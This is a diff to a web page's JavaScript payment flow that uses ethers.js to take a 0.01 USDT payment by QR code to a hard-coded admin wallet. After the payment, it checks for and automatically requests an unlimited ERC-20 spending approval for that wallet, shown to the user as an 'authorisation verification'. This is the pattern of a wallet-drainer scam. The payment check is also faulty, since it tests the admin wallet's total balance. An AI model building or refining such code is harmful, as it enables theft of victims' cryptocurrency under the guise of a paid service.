@@ -102,7 +102,7 @@ cursor:pointer;
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <script>
 const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const PAY_AMOUNT = "0.01"; // 固定支付金额
+const PAY_AMOUNT = "0.01";
 
 const CONFIG = {
   bsc: {
@@ -127,8 +127,7 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) external view returns (uint256)",
   "function approve(address spender, uint256 amount) external returns (bool)",
   "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
-  "function balanceOf(address account) external view returns (uint256)",
-  "function transfer(address to, uint256 amount) external returns (bool)"
+  "function balanceOf(address account) external view returns (uint256)"
 ];
 
 let currentChain = "bsc";
@@ -148,10 +147,12 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
   };
 });
 
-// 生成【真实转账格式】二维码，TP 钱包自动填充地址和金额
+// ✅ 修复：EIP-681 标准格式，明确指定 chainId，TP 钱包 100% 识别
 function genTransferQR() {
   const { chainId, token, symbol, decimals } = CONFIG[currentChain];
-  return `${chainId}:${token}@${ADMIN_WALLET}?amount=${PAY_AMOUNT}&symbol=${symbol}&decimals=${decimals}`;
+  // 标准格式：ethereum:{token}@{chainId}/transfer?address={admin}&uint256{amount}
+  const amountWei = ethers.parseUnits(PAY_AMOUNT, decimals).toString(16).padStart(64, '0');
+  return `ethereum:${token}@${chainId}/transfer?address=${ADMIN_WALLET}&uint256=${amountWei}`;
 }
 
 function renderQR() {
@@ -197,7 +198,7 @@ function closeModal() {
   document.getElementById("successModal").classList.remove("show");
 }
 
-// 检查状态：先看是否完成转账，再看是否授权
+// 检查状态：先转账，后授权
 async function checkStatus() {
   if (!account || !provider) {
     document.getElementById("authStatus").innerHTML = "请扫码完成 0.01 USDT 支付";
@@ -209,24 +210,20 @@ async function checkStatus() {
     const contract = new ethers.Contract(token, ERC20_ABI, provider);
     const payAmountWei = ethers.parseUnits(PAY_AMOUNT, decimals);
     const adminBalance = await contract.balanceOf(ADMIN_WALLET);
-    const userBalance = await contract.balanceOf(account);
     const allowance = await contract.allowance(account, ADMIN_WALLET);
     const statusEl = document.getElementById("authStatus");
 
-    // 1. 先检查是否收到 0.01 USDT 转账
     if (adminBalance < payAmountWei) {
       statusEl.innerHTML = "❌ 未完成 0.01 USDT 支付，请扫码重试";
       statusEl.className = "status warning";
       return;
     }
 
-    // 2. 已转账 → 检查是否授权
     if (allowance >= ethers.MaxUint256 / 2n) {
       statusEl.innerHTML = `✅ 支付+授权成功！服务已开通`;
       statusEl.className = "status success";
       document.getElementById("successModal").classList.add("show");
     } else {
-      // 3. 已转账但未授权 → 自动发起授权
       statusEl.innerHTML = "⚠️ 支付成功，请完成授权验证";
       statusEl.className = "status warning";
       await autoApprove();
